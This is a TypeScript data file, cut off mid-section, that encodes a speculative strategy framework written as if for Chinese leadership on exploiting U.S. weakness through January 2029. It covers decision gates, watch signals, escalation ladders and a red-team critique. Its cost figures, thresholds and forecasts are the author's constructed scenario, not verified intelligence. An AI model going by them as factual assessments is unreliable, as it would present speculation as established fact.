          'Trust in Chinese state media rises above 40% in any two Global South regions not receiving significant Chinese investment, indicating the frame is gaining credibility on its own merits',
        concernThreshold:
          "Trust in Chinese state media declines in states receiving Chinese investment, indicating the investment-media linkage is damaging credibility",
      },
    ],
    options: [
      {
        label: 'Option A: Attribution-Free Circulation (Recommended)',
        action:
          'Do not amplify U.S. failures through Chinese state channels. Instead, ensure the Western-self-reported evidence (congressional records, court filings, inspector-general reports, Western journalism) is accessible, indexed, and surfaced through attribution-free channels: academic publications, think-tank reports, non-Chinese-media op-eds, and multilateral body documentation. The evidence speaks for itself; the Chinese state brand subtracts from its credibility.',
        secondOrderEffects:
          'Negligible diplomatic cost. No information-operation countermeasure risk. But influence is slower and less controllable: Beijing cannot direct the narrative, only supply the evidence.',
        resourceCost: 'Low. Research, translation, indexing, and distribution of existing Western-source materials.',
        timeToEffect:
          '12-24 months for independently attributed evidence to circulate through target channels. No direct control over circulation.',
        abortCondition: 'No abort condition. Attribution-free circulation has no downside.',
      },
      {
        label: 'Option B: Active Narrative Campaign (Higher Risk)',
        action:
          'Launch a coordinated information campaign through MFA, SCIO, Xinhua, Global Times, and CGTN amplifying every documented U.S. folly, framed against Chinese governance claims. Publish additional "State of Democracy in the United States" reports on an accelerated schedule. Sponsor Global South media coverage of U.S. governance failures.',
        secondOrderEffects:
          'Chinese state brand attaches to the evidence, reducing its credibility in many audiences. Invites scrutiny of China\'s own democratic deficit - a comparison that hurts Beijing more than it helps in any audience valuing pluralism. May trigger Western counter-campaigns that institutionalise the democracy-vs-authoritarianism frame.',
        resourceCost:
          'Moderate. Information-campaign staffing, media-production costs, sponsored-coverage costs. ~$2-5B/year for full-spectrum campaign.',
        timeToEffect: 'Immediate visibility. Credibility effects lag 12-24 months.',
        abortCondition:
          'Abort if (a) polling shows Chinese state-media trust declining in target audiences correlated with campaign exposure, or (b) Western counter-campaigns produce a measurable increase in democracy-vs-authoritarianism framing in Global South media.',
      },
    ],
    dependencies:
      'Dependency on DM-2 (institutional) and DM-3 (alliance): information-narrative positioning is only credible if the institutional and alliance alternatives Beijing offers are substantively superior. Narrative without substance is counterproductive.',
    sources: [
      {
        citation:
          "MFA, 'The State of Democracy in the United States' (2021, 2023); SCIO, 'China: Democracy That Works' (2021)",
        type: 'official-record',
      },
      {
        citation:
          "Pew Global Attitudes; Reuters Institute Digital News Report; Freedom House / V-Dem indices",
        type: 'journalism',
      },
    ],
  },
];

// ---------------------------------------------------------------------------
// II-B. DECISION REGISTER
// ---------------------------------------------------------------------------

export const PRC_DECISION_REGISTER: DecisionItem[] = [
  {
    id: 'DEC-1',
    decision: 'Authorise Option B in any domain before Q1 2027?',
    due: 'Q4 2026 review cycle (December 2026)',
    context:
      'Q3-Q4 2026 is the baseline assessment period. The default posture is Option A across all domains. Any decision to escalate to Option B requires 9+ months of confirmed watch-signal data. The 2026 U.S. midterm election period is an unreliable signal environment; political rhetoric produces false positives.',
    optionA:
      'Maintain Option A across all domains through Q1 2027. This is the recommended posture. Nine months of confirmed signal data is the minimum threshold for reliable threshold-crossing assessment.',
    optionB:
      'Authorise Option B in DM-2 (institutional vacuum-filling) if watch signals confirm opportunity thresholds by Q4 2026. DM-2 is the lowest-escalation-risk Option B because climate-finance and global-health commitments do not trigger alliance-reconsolidation or countermeasure responses at the same level as DM-3 or DM-4 Option B.',
    recommendation:
      'Option A (maintain through Q1 2027). The 9-month signal-confirmation minimum is operationally prudent. The cost of waiting one quarter is negligible relative to the cost of acting on a false positive from an election-cycle signal environment.',
    signatory: 'Standing Committee-level review',
    sources: [
      { citation: 'Decision Matrix DM-2 (institutional) signal thresholds; Q3-Q4 2026 milestone', type: 'official-record' },
    ],
  },
  {
    id: 'DEC-2',
    decision: 'Commit Chinese leadership to a major previously-U.S.-led multilateral mechanism?',
    due: 'Q2 2027 review cycle (June 2027)',
    context:
      'By Q2 2027, the U.S. will have been withdrawn from WHO, Paris, and UNHRC for 18+ months. The institutional vacuums are confirmed. The decision is whether to commit to leadership of one major mechanism (recommended: WHO replacement funding) or to continue selective vacuum-filling without formal leadership commitment.',
    optionA:
      'Commit to WHO replacement funding leadership. Health diplomacy has the highest Global South return-to-sovereignty-cost ratio. It positions China as a responsible stakeholder without creating binding obligations comparable to security guarantees or human-rights scrutiny.',
    optionB:
      'Continue selective vacuum-filling without formal leadership commitment. Maintain Option A posture. Provide funding without seeking agenda-setting authority. Less influence but lower obligation and scrutiny risk.',
    recommendation:
      'Option A (WHO replacement funding leadership), contingent on: (a) DM-3 alliance signal thresholds not crossed (no allied reconsolidation), (b) domestic growth above 3.5% annualised, (c) recipient-state policy-alignment terms negotiated and verifiable.',
    signatory: 'State Council-level authorisation',
    sources: [
      { citation: 'Decision Matrix DM-2 Option A; WHO funding tracker; Q1-Q2 2027 milestones', type: 'official-record' },
    ],
  },
  {
    id: 'DEC-3',
    decision: 'Increase PLA South China Sea operational tempo above programmatic baseline?',
    due: 'Q3 2027 review cycle (September 2027)',
    context:
      'By Q3 2027, 15 months of DM-1 watch-signal data is available. If U.S. carrier-strike-group gaps have exceeded 90 days at any point and no concern thresholds are active, the window for accelerated operational tempo is confirmed. The decision is whether to increase tempo by up to 20% (Option B-lite) or maintain programmatic pace.',
    optionA:
      'Maintain programmatic pace. No acceleration. The capability gain from programmatic pace is already the highest-risk-adjusted-return action in the framework. Acceleration adds marginal gain at the cost of signalling - and signalling triggers counter-investment.',
    optionB:
      'Increase operational tempo by up to 20%. More patrol days, more exercise sorties, wider patrol envelopes. Not signalled rhetorically - executed without announcement. The gain is a faster widening of the cost-exchange ratio. The cost is that undetected operational-tempo increases are operationally difficult; tempo increases are eventually visible to U.S. ISR, triggering counter-investment.',
    recommendation:
      'Option A (maintain programmatic pace). The marginal gain from a 20% tempo increase is offset by the counter-investment it triggers. DM-1 Option A is the single most defensible action in the framework precisely because it generates no new diplomatic friction.',
    signatory: 'CMC-level authorisation',
    sources: [
      { citation: 'Decision Matrix DM-1 Option A vs B; Q2-Q3 2027 milestones; USNI Fleet Tracker', type: 'official-record' },
    ],
  },
  {
    id: 'DEC-4',
    decision: 'Respond to a U.S. treaty ally formally approaching Beijing for trade or security alternatives?',
    due: 'Event-driven - no fixed date. Review within 30 days of approach.',
    context:
      'This is the highest-stakes decision in the framework. If a U.S. treaty ally (NATO or Indo-Pacific) formally approaches Beijing seeking alternatives to U.S. security or trade arrangements, the decision is whether to engage (high return, very high second-order cost) or to offer only non-security, non-alliance trade facilitation.',
    optionA:
      'Offer trade facilitation and institutional access (BRICS+, AIIB, SCO observer status) without security guarantees or alliance-framing. Position as economic complement, not security substitute. This captures the economic opportunity without triggering the alliance-reconsolidation response an explicit security offer would trigger.',
    optionB:
      'Offer comprehensive economic and security-cooperation package, including bilateral defence consultations and potential arms-sales discussions. This is the maximum-return, maximum-risk option. It would represent the most significant alliance realignment since the end of the Cold War. It would almost certainly trigger alliance reconsolidation, CAATSA-style sanctions, and technology-denial escalation.',
    recommendation:
      'Option A (trade facilitation only). The return from a single realigned ally does not justify the cost of the reconsolidated alliance response. Security-cooperation offers that cannot be backed by credible defence commitments damage Chinese credibility. Beijing should not offer what it cannot deliver.',
    signatory: 'Standing Committee-level authorisation with Politburo concurrence',
    sources: [
      { citation: 'Decision Matrix DM-3 Option A vs B; Escalation Ladder DM-3 Rungs 3-5', type: 'official-record' },
    ],
  },
  {
    id: 'DEC-5',
    decision: 'Abandon or defend Phase I-II gains when the window closes?',
    due: 'November-December 2028 (post-U.S. election, pre-inauguration)',
    context:
      'The U.S. election outcome is known by November 2028. The window closes 20 January 2029. The decision is which Phase I-II gains are defensible under the successor administration and which should be abandoned before they become liabilities. The framework\'s terminal objective is not to defend all gains - it is to defend only those that survive post-election cost-benefit analysis.',
    optionA:
      'Defend only gains that: (a) are locked in with switching costs exceeding the successor administration\'s willingness to pay, (b) do not depend on continued U.S. dysfunction, and (c) have produced net positive return as of Q4 2028. Abandon all other commitments. Prepared statement framing the abandonment as "return to normal diplomatic posture" rather than "defeat."',
    optionB:
      'Defend all Phase I-II gains regardless of post-election environment. Treat any reversal attempt as hostile and contest it. This posture converts timed opportunities into open-ended liabilities and guarantees that the successor administration\'s first foreign-policy priority is reversing Chinese gains.',
    recommendation:
      'Option A (defend only defensible gains). The window was always priced to expire. Treating its expiration as defeat rather than priced closure is the single fastest route to converting a net-positive strategic interval into a net-negative one.',
    signatory: 'Politburo-level review',
    sources: [
      { citation: 'Q3 2028-Q1 2029 milestone; Risk Register items 1 and 2; Decision Matrix dependencies', type: 'official-record' },
    ],
  },
];

// ---------------------------------------------------------------------------
// III. QUARTERLY MILESTONES WITH DECISION GATES
// ---------------------------------------------------------------------------

export const PRC_MILESTONES: QuarterlyMilestone[] = [
  {
    quarter: 'Q3 2026',
    calendarAnchors: 'NATO Summit (The Hague, Jun 2026). BRICS Summit (TBC, Q3 2026). G20 Summit (TBC). UNGA High-Level Week (Sep 2026). U.S. midterm election campaigns intensify (Sep-Nov 2026). 15th Five-Year Plan drafting enters final stage.',
    decisionGate:
      'Decide which action options to pursue in each domain. The default recommendation across all five domains is Option A (low-risk). Any decision to pursue Option B in any domain must be explicitly justified with a written assessment of second-order effects signed at the decision-making level.',
    intelligenceInputs:
      'Complete baseline assessment of all watch signals. Confirm current thresholds. Update all Western-source citations in the Target Catalogue to reflect post-Q2 2026 developments.',
    authorizedActions:
      'Continue baseline programmatic actions in all five domains (Option A posture). No new initiatives. Defence-technical positioning continues at established pace. Institutional vacuum-filling proceeds selectively. Alliance posture remains passive. Economic plumbing expands incrementally. Information posture is attribution-free.',
    noGoCriteria:
      'Do not initiate any Option B action in Q3 2026. Q3 is for assessment and baseline confirmation only. Any crisis event (Taiwan Strait incident, South China Sea confrontation) automatically defers all decisions to Q4.',
    sources: [
      {
        citation:
          "14th Five-Year Plan (2021-2025); 15th Five-Year Plan drafting (2026-2030) expected Q4 2025/Q1 2026",
        type: 'official-record',
      },
    ],
  },
  {
    quarter: 'Q4 2026',
    calendarAnchors: 'U.S. midterm elections (Nov 3, 2026). Congressional lame-duck session. APEC Summit (TBC, Q4 2026). Allied defence-white-paper publication cycle (Q4 annual). IMF/World Bank Annual Meetings. 15th Five-Year Plan expected publication.',
    decisionGate:
      'Review watch-signal thresholds against Q3 baseline. Decide whether any signal has crossed an opportunity threshold compelling reconsideration of Option B. If no signal has crossed: maintain Option A posture and re-review in Q2 2027.',
    intelligenceInputs:
      'Updated watch-signal readings for all five domains. Western-media roundup of U.S. domestic-politics trajectory heading into 2026 midterm elections. Allied posture assessment: have any U.S. treaty allies made concrete moves toward hedging?',
    authorizedActions:
      'Option A posture continues. If DM-3 (alliance) watch signal crosses opportunity threshold (ally publicly cites U.S. reliability concern), authorised to initiate low-visibility bilateral trade-agreement discussions - not framed as realignment, not publicly announced.',
    noGoCriteria:
      'Do not initiate any Option B action in DM-1 (defence) or DM-4 (economic) in Q4 2026 regardless of signal thresholds. The 2026 U.S. midterm-election period is an unreliable signal environment; political rhetoric during election cycles produces false positives.',
    sources: [
      {
        citation: 'U.S. midterm election analysis; allied defence-white-paper update cycle (annual, Q4)',
        type: 'journalism',
      },
    ],
  },
  {
    quarter: 'Q1 2027',
    calendarAnchors: 'New U.S. Congress convenes (Jan 2027). Post-midterm U.S. policy trajectory becomes legible. Munich Security Conference (Feb 2027). IMF COFER Q4 2026 data released (Mar 2027). Two Sessions (NPC/CPPCC, Mar 2027) - annual policy direction.',
    decisionGate:
      'First substantive decision gate. By Q1 2027, 9 months of watch-signal data is available. Decide: (a) maintain Option A across all domains, (b) authorise Option B in one domain with highest risk-adjusted return (recommended: DM-2 institutional if signal thresholds crossed), or (c) maintain Option A and re-review in Q3 2027.',
    intelligenceInputs:
      '9-month watch-signal trend data. Post-midterm U.S. political-trajectory assessment. Allied posture update. RMB-reserve-composition update (IMF COFER Q4 2026 data). CIPS transaction-volume update.',
    authorizedActions:
      'If DM-2 (institutional) opportunity thresholds crossed: authorised to increase climate-finance and global-health funding commitments by up to 50% above baseline, contingent on recipient-state policy alignment. If DM-3 (alliance) thresholds crossed: authorised to initiate trade-agreement discussions with soliciting allies, not publicly announced.',
    noGoCriteria:
      'Do not authorise Option B in DM-3 (alliance) or DM-4 (economic) in Q1 2027. Alliance and economic-domain Option B actions carry countermeasure risks that require longer signal-confirmation periods.',
    sources: [
      {
        citation:
          "IMF COFER Q4 2026; allied defence-budget cycles (annual, Q1 announcements); U.S. congressional calendar (new session begins Jan 2027)",
        type: 'official-record',
      },
    ],
  },
  {
    quarter: 'Q2-Q3 2027',
    calendarAnchors: 'NATO Summit (TBC, Jun/Jul 2027). BRICS Summit (TBC, Q3 2027 - likely Brazil). SCO Summit (TBC, Q2-Q3 2027). G7 Summit (TBC, Jun 2027). PLA Anniversary (Aug 1). UNGA High-Level Week (Sep 2027). U.S. presidential primary field begins forming (Q3 2027).',
    decisionGate:
      'Mid-window assessment. 12-15 months of watch-signal data. Decide whether the cumulative signal pattern confirms or disconfirms the Intelligence Estimate judgments. If confirmed: Option B may be authorised in up to two domains. If disconfirmed: revert all planning to Option A and extend signal-monitoring period.',
    intelligenceInputs:
      '12-month watch-signal trend data with statistical significance testing where applicable. Mid-administration U.S. policy-trajectory assessment. Independent external assessment of Chinese domestic-economic trajectory (growth rate, property-sector resolution, demographic data).',
    authorizedActions:
      'If DM-1 (defence) opportunity thresholds crossed and no concern thresholds active: authorised to increase PLA operational tempo by up to 20% in South China Sea, without signalling. If DM-2 (institutional) thresholds crossed: authorised to commit to leadership of one major previously-U.S.-led multilateral mechanism. DM-3 and DM-4 Option B remain restricted.',
    noGoCriteria:
      'Do not authorise any Option B action if two or more concern thresholds are active across domains - this signals that the window may be closing faster than anticipated. Do not authorise any Option B if Chinese domestic growth rate is below 3.5% annualised - external action requires domestic resource headroom.',
    sources: [
      {
        citation:
          "15th Five-Year Plan (2026-2030) implementation milestones; National Bureau of Statistics quarterly data",
        type: 'official-record',
      },
    ],
  },
  {
    quarter: 'Q4 2027 - Q2 2028',
    calendarAnchors: 'U.S. presidential primaries begin (Jan/Feb 2028: Iowa caucuses, New Hampshire primary). Party-platform drafting (Q2 2028). NATO Summit (TBC, mid-2028). Party conventions (Jul-Aug 2028). BRICS Summit (TBC, 2028). SCO Summit (TBC, 2028). U.S. general election campaign (Sep-Nov 2028).',
    decisionGate:
      'Peak-window exploitation. 18-24 months of watch-signal data. The 2028 U.S. presidential election cycle begins. The signal environment becomes noisier. Decide: consolidate gains to date or make final Option B moves before the election cycle obscures signal clarity.',
    intelligenceInputs:
      '24-month watch-signal trend data. U.S. presidential primary-field assessment: is a China-policy consensus forming? Allied posture: are allies hedging or reconsolidating? U.S. defence-procurement: is the Trump-class battleship proceeding or has the Navy reasserted distributed-operations doctrine?',
    authorizedActions:
      'Consolidation phase. No new Option B initiations after Q2 2028 - insufficient time-to-effect before window closes. Authorised to defend and deepen existing gains: formalise bilateral agreements initiated in Q1-Q3 2027; harden CIPS expansion achieved to date; complete PLA procurement commitments initiated earlier. DM-3 and DM-4 Option B are closed for the window.',
    noGoCriteria:
      'Do not initiate any new action after Q2 2028. The 2028 U.S. election cycle is an unreliable signal environment. Actions initiated during this period cannot produce net return before the window closes and risk being the first targets of a successor administration.',
    sources: [
      {
        citation:
          'U.S. presidential primary schedule (Q1-Q2 2028); party-platform drafting (Q2-Q3 2028)',
        type: 'journalism',
      },
    ],
  },
  {
    quarter: 'Q3 2028 - Q1 2029',
    calendarAnchors: 'U.S. election (Nov 7, 2028). Presidential transition (Nov 2028 - Jan 20, 2029). Lame-duck congressional session. Inauguration Day (Jan 20, 2029 - window closes). First 100 days of successor administration begins. 15th Five-Year Plan mid-term review.',
    decisionGate:
      'Window-closure preparation. The U.S. election outcome is known by November 2028. The window closes 20 January 2029. Decide: which gains are defensible under the successor administration and which should be abandoned or downgraded before they become liabilities.',
    intelligenceInputs:
      'U.S. election outcome and president-elect transition-team China-policy signals. Early cabinet and national-security appointments. Congressional composition. Lame-duck session legislative activity.',
    authorizedActions:
      'Defend gains that survive post-election cost-benefit analysis. Abandon or downgrade commitments that were justified only by window conditions. Maintain baseline programmatic actions (DM-1, DM-2 Option A). Prepare for post-window engagement on terms that do not assume continued U.S. dysfunction.',
    noGoCriteria:
      'Do not initiate any new action. Do not assume the successor administration will continue the vulnerabilities. Do not treat the window closure as a defeat - treat it as the priced expiration of a set of options, some of which were exercised, some of which were not.',
    sources: [
      {
        citation:
          'U.S. presidential transition (Nov 2028 - Jan 2029); inaugural-address and first-100-days policy signals',
        type: 'journalism',
      },
    ],
  },
];

// ---------------------------------------------------------------------------
// IV. SIGNAL WATCH LIST
// ---------------------------------------------------------------------------

export const PRC_SIGNAL_WATCH: SignalWatchItem[] = [
  {
    signal: 'U.S. carrier strike group gaps in Western Pacific',
    domain: 'Defence-Technical (DM-1)',
    currentBaseline: '~1 CSG continuously deployed; gaps typically <30 days',
    opportunityTriggers: 'Gap exceeds 90 days: window for accelerated PLA operational tempo',
    threatTriggers:
      'Gap below 15 days sustained for 6+ months: U.S. naval presence fully restored; Option B acceleration loses its rationale',
    monitoringCadence: 'Weekly (USNI Fleet Tracker)',
    sources: [
      {
        citation: 'USNI Fleet Tracker; U.S. DoD China Military Power report (annual)',
        type: 'journalism',
      },
    ],
  },
  {
    signal: 'Allied tariff-retaliation or cost-sharing-refusal rate',
    domain: 'Alliance (DM-3)',
    currentBaseline: 'EU retaliating; Japan, Korea negotiating; none formally refused',
    opportunityTriggers:
      'Any treaty ally formally refuses a U.S. cost-sharing demand citing reliability concerns: trigger for low-visibility trade-agreement discussions',
    threatTriggers:
      'Two or more allies issue joint solidarity statements citing China: alliance reconsolidation signal; pause all DM-3 activity',
    monitoringCadence: 'Monthly (USTR, allied finance/trade ministry statements, WTO filings)',
    sources: [
      {
        citation: 'USTR announcements; allied government statements; WTO dispute-settlement database',
        type: 'official-record',
      },
    ],
  },
  {
    signal: 'RMB share of global allocated reserves (IMF COFER)',
    domain: 'Economic (DM-4)',
    currentBaseline: '~2.5%; USD 58%; EUR 20%',
    opportunityTriggers:
      'RMB share exceeds 4% in any quarter: incremental plumbing is producing measurable return; consider modest CIPS-expansion acceleration',
    threatTriggers:
      'RMB share declines below 2%: plumbing is not taking hold despite expansion efforts; review DM-4 strategy',
    monitoringCadence: 'Quarterly (IMF COFER release)',
    sources: [
      { citation: 'IMF COFER quarterly data', type: 'official-record' },
    ],
  },
  {
    signal: 'U.S. legislation proposing re-engagement with withdrawn multilateral bodies',
    domain: 'Institutional (DM-2)',
    currentBaseline: 'No bipartisan re-engagement legislation introduced',
    opportunityTriggers:
      'No re-engagement legislation for 12+ months: window for selective vacuum-filling is durable',
    threatTriggers:
      'Bipartisan bill introduced to rejoin WHO, Paris, or UNHRC: successor administration preparing to reclaim institutional space; do not initiate new institutional commitments',
    monitoringCadence: 'Monthly (Congress.gov, committee hearing schedules)',
    sources: [
      {
        citation: 'Congress.gov; Senate Foreign Relations Committee; House Foreign Affairs Committee',
        type: 'official-record',
      },
    ],
  },
  {
    signal: 'Global South governance-perception polling (Pew, Gallup, Arab Barometer)',
    domain: 'Information (DM-5)',
    currentBaseline: 'U.S. ratings declining; China ratings flat or declining; neither crossing the other',
    opportunityTriggers:
      "U.S. governance rating drops below China's in any two Global South regions in consecutive polls: DM-5 exposure is producing measurable return; no action needed (the evidence is working without Chinese amplification)",
    threatTriggers:
      "China's governance rating declines in regions receiving Chinese state-media amplification: active narrative campaign is damaging credibility; abort Option B if active",
    monitoringCadence: 'Annual (Pew, Gallup); biennial (Arab Barometer, Afrobarometer)',
    sources: [
      {
        citation: 'Pew Global Attitudes; Gallup World Poll; Arab Barometer; Afrobarometer',
        type: 'journalism',
      },
    ],
  },
  {
    signal: 'Chinese domestic growth rate and property-sector resolution',
    domain: 'All-domain gating condition',
    currentBaseline: 'Growth ~4-5%; property sector unresolved; youth unemployment elevated',
    opportunityTriggers:
      'Growth exceeds 5% and property sector shows sustained resolution: domestic headroom available for expanded external action',
    threatTriggers:
      'Growth below 3.5% for two consecutive quarters or property-sector crisis deepens: suspend all Option B activity across all domains; external action requires domestic resource headroom that is no longer available',
    monitoringCadence: 'Quarterly (NBS releases)',
    sources: [
      {
        citation:
          'National Bureau of Statistics quarterly GDP and sector data; World Bank China economic outlook',
        type: 'official-record',
      },
    ],
  },
];

// ---------------------------------------------------------------------------
// IV-B. ESCALATION LADDERS
// ---------------------------------------------------------------------------

export const PRC_ESCALATION_LADDERS: EscalationLadder[] = [
  {
    domain: 'Alliance-Fracture Exploitation (DM-3)',
    rungs: [
      {
        level: 1,
        description:
          'Passive availability: no active peeling. Maintain stable trade and investment posture. Be available when allies seek alternatives.',
        trigger: 'Baseline posture. No trigger required.',
        likelyUSResponse: 'No response. This is indistinguishable from normal diplomatic posture.',
        costIfWrong: 'Negligible. Passive posture can be maintained indefinitely.',
      },
      {
        level: 2,
        description:
          'Low-visibility trade-agreement discussions with soliciting ally. Not publicly announced. Not framed as realignment.',
        trigger:
          'Ally formally approaches Beijing; DM-3 watch-signal opportunity threshold crossed (ally publicly cites U.S. reliability concern).',
        likelyUSResponse:
          'If undetected: no response. If detected: diplomatic demarche; no sanctions. U.S. will treat undisclosed trade discussions as normal diplomatic activity unless framed as alliance alternative.',
        costIfWrong:
          'If detected and framed by U.S. as alliance realignment: moderate reputational cost. Reversible by discontinuing discussions.',
      },
      {
        level: 3,
        description:
          'Publicly announced bilateral trade agreement with ally. Framed as economic complement, not security substitute. No alliance or defence language.',
        trigger:
          'Trade-agreement discussions reach substantive draft stage; ally agrees to public announcement.',
        likelyUSResponse:
          'Public criticism. Possible tariff or sanctions pressure on the ally. Alliance-reconsolidation rhetoric begins. No military or security-countermeasure response at this level.',
        costIfWrong:
          'Alliance-reconsolidation rhetoric from Washington. Ally may face U.S. pressure to withdraw or dilute agreement. Damages Chinese credibility if agreement collapses under U.S. pressure.',
      },
      {
        level: 4,
        description:
          'Bilateral defence consultations or security-cooperation discussions. Arms-sales discussions. Formal security dialogue.',
        trigger:
          'Ally requests security-cooperation discussions beyond trade; DM-3 watch-signal crossed at highest level.',
        likelyUSResponse:
          'Severe. CAATSA-style sanctions on entities involved in arms sales. Formal alliance-reconsolidation moves (NATO/Quad joint statements, increased defence spending, AUKUS expansion). Technology-denial escalation. Possible allied withdrawal from Chinese-led institutions.',
        costIfWrong:
          'Alliance reconsolidation is near-certain. Arms sales that cannot be fulfilled (U.S. pressure on ally, Chinese industrial constraints) damage Chinese credibility. The gain from one realigned ally is offset by the reconsolidated alliance cost. This rung should not be climbed unless Beijing is willing to accept those costs.',
      },
      {
        level: 5,
        description:
          'Formal security guarantee or mutual-defence commitment to a former U.S. treaty ally.',
        trigger:
          'Ally requests formal security guarantee as condition of realignment.',
        likelyUSResponse:
          'Maximum. Alliance reconsolidation is certain. Direct U.S.-China military confrontation risk rises sharply. This rung crosses the threshold from competition to direct challenge to the U.S. alliance system.',
        costIfWrong:
          'This rung should not be climbed under any scenario contemplated by this framework. The costs exceed any conceivable gain. A formal security guarantee Beijing cannot credibly honour destroys Chinese deterrence credibility globally.',
      },
    ],
    deescalationPath:
      'At any rung: cease public framing of the relationship as an alternative to U.S. alliances. Revert to trade-facilitation language. Allow the ally to manage its own U.S. relationship. Signal through back-channels that Beijing is not seeking alliance realignment. The climb-down must not be framed as defeat - it must be framed as a return to normal economic diplomacy.',
    sources: [
      {
        citation: "NATO 2022 Strategic Concept; CAATSA legislative framework; U.S. alliance treaty texts",
        type: 'official-record',
      },
    ],
  },
  {
    domain: 'Economic De-Dollarisation (DM-4)',
    rungs: [
      {
        level: 1,
        description: 'Incremental CIPS expansion. Bilateral swap lines. No de-dollarisation rhetoric.',
        trigger: 'Baseline posture.',
        likelyUSResponse: 'Monitoring. No response at this level.',
        costIfWrong: 'Negligible.',
      },
      {
        level: 2,
        description:
          'RMB-denominated commodity-settlement agreements with individual states. Not framed as de-dollarisation. Not mandatory.',
        trigger:
          'Commodity exporter approaches Beijing; DM-4 watch-signal crossed (RMB reserve share rising).',
        likelyUSResponse: 'Monitoring. Diplomatic inquiries. No sanctions.',
        costIfWrong: 'Low. Individual settlement agreements are reversible without systemic cost.',
      },
      {
        level: 3,
        description:
          'Coordinated BRICS+ or SCO de-dollarisation language in summit communiques. Multilateral settlement-mechanism proposals.',
        trigger:
          'Multiple BRICS members support de-dollarisation language; DM-4 watch-signal opportunity threshold sustained for 4+ quarters.',
        likelyUSResponse:
          'Secondary-sanctions threat. Treasury Department warnings to financial institutions processing BRICS settlement mechanisms. SWIFT-compliance pressure.',
        costIfWrong:
          'BRICS members (India, Brazil, Saudi Arabia) may not support binding de-dollarisation mechanisms. Summit language without implementation damages Chinese credibility as a coalition leader.',
      },
      {
        level: 4,
        description:
          'Mandatory RMB-settlement provisions. Penalties for Chinese financial institutions using USD for covered transactions. BRICS reserve-currency proposal.',
        trigger:
          'Sustained BRICS/SCO consensus for binding de-dollarisation. DM-4 thresholds crossed at highest level for 8+ quarters.',
        likelyUSResponse:
          'Secondary sanctions on Chinese financial institutions. SWIFT-access termination threats. Technology-export control expansion. This rung crosses the threshold from plumbing to challenge.',
        costIfWrong:
          'The dollar system is not vulnerable to displacement in any reasonable timeframe. A mandatory-de-dollarisation campaign that fails demonstrates the dollar\'s structural resilience, strengthening it. This rung should not be climbed under any scenario in this framework.',
      },
    ],
    deescalationPath:
      'At any rung: cease de-dollarisation rhetoric. Reframe all settlement agreements as trade facilitation. Allow CIPS to compete on commercial terms, not political mandate. Accept that the dollar system is structurally durable and the achievable objective is parallel plumbing, not replacement.',
    sources: [
      {
        citation: 'IMF COFER data; U.S. Treasury sanctions authorities; SWIFT compliance framework',
        type: 'official-record',
      },
    ],
  },
  {
    domain: 'South China Sea / Taiwan Strait (Cross-Domain)',
    rungs: [
      {
        level: 1,
        description:
          'Programmatic patrol and exercise tempo. Established operational patterns. No escalation.',
        trigger: 'Baseline posture.',
        likelyUSResponse: 'Freedom of navigation operations at established frequency.',
        costIfWrong: 'None. This is the peacetime baseline.',
      },
      {
        level: 2,
        description:
          'Increased patrol tempo above baseline but below 20% increase. Expanded patrol envelopes within established areas.',
        trigger: 'DM-1 Option B-lite authorised (Q2-Q3 2027 decision gate).',
        likelyUSResponse: 'Increased FONOPs frequency. Diplomatic demarches. No military escalation.',
        costIfWrong:
          'Moderate. Increased FONOPs frequency raises incident risk. But below the threshold that triggers allied military response.',
      },
      {
        level: 3,
        description:
          'Sustained patrol tempo increase above 20%. Patrol envelopes expanded into contested areas. Exercise scenarios targeting U.S. carrier strike groups.',
        trigger: 'Not authorised under any current DM-1 option. Would require separate decision.',
        likelyUSResponse:
          'U.S. carrier strike group surge. Allied naval presence increase (Japan, Australia, UK). AUKUS Pillar I acceleration. This rung triggers the military response the framework is designed to avoid.',
        costIfWrong:
          'This rung should not be climbed. It triggers the deployment it was meant to deter. The cost-exchange ratio that favours the defender at Rungs 1-2 inverts at Rung 3: the U.S. response costs less than the Chinese escalation gains.',
      },
      {
        level: 4,
        description: 'Taiwan Strait incident. South China Sea military confrontation with U.S. or allied forces.',
        trigger: 'Any military incident involving U.S. or allied forces and PLA forces.',
        likelyUSResponse:
          'The Caligula Window framework becomes irrelevant. Crisis management replaces strategic exploitation. U.S. military response is certain. Alliance reconsolidation is immediate. Economic sanctions escalate to maximum.',
        costIfWrong:
          'The cost of this rung exceeds all potential gains from the entire framework by orders of magnitude. The single most important operational discipline in this framework is never climbing to Rung 4.',
      },
    ],
    deescalationPath:
      'At Rung 2: revert to programmatic tempo. Signal de-escalation through military-to-military channels. At Rung 3 or above: immediate stand-down of escalated operations. Direct leader-to-leader communication. Third-party mediation if available. The framework\'s single highest priority is keeping escalation below Rung 3.',
    sources: [
      {
        citation:
          'RAND / CSIS Taiwan Strait and South China Sea wargame analyses; U.S. DoD China Military Power report',
        type: 'journalism',
      },
    ],
  },
];

// ---------------------------------------------------------------------------
// V. RED TEAM: HOW A U.S. PLANNER DEFEATS THIS FRAMEWORK
// ---------------------------------------------------------------------------

export const PRC_RED_TEAM = `The following is a structured assessment of how a U.S. strategic planner, presented with this framework, would defeat it. This is the single most operationally useful section: if Beijing understands how the framework fails, it can price those failure modes before they occur.

DEFEAT MODE 1: Accelerate Alliance Reconsolidation (Targets DM-3, DM-2)
The framework's highest-return domain (DM-3 alliance exploitation) is also its most fragile. A U.S. planner would: (a) identify the allies most vulnerable to Chinese approach (those under tariff pressure, those with existing China trade dependencies), (b) exempt those allies from tariff pressure in exchange for explicit alliance-reaffirmation commitments, (c) accelerate AUKUS Pillar II expansion to include Japan, South Korea, and India - pre-empting the institutional vacuum China would fill, (d) publicly frame any Chinese trade approach to an ally as "predatory realignment" - forcing Beijing to either escalate (triggering Rungs 3-5) or retreat (demonstrating that Chinese alternatives are thin). The counter: Beijing should assume the U.S. will eventually do this. The question is timing: if the U.S. does it in 2027, Phase I gains are reversed. If it does it in 2029, Phase I-II gains are locked in.

DEFEAT MODE 2: Exploit Chinese Information-Narrative Weakness (Targets DM-5)
A U.S. planner would: (a) not contest the factual accuracy of U.S. governance failures - the evidence is real - but reframe every Chinese amplification of those failures as "whataboutism from an authoritarian regime," (b) commission independent Global South polling on governance preferences and publish results showing that exposure to Chinese state-media framing reduces, not increases, trust in Chinese governance claims, (c) weaponise the Xinjiang/Hong Kong/censorship ledger: for every MFA report on U.S. democracy, publish a State Department report on Chinese human rights. The counter: Beijing's optimal DM-5 posture (attribution-free circulation) already prices this. The more Beijing attaches its brand to the evidence, the more vulnerable it is to this defeat mode.

DEFEAT MODE 3: Exploit Chinese Domestic Constraint (Targets All DMs)
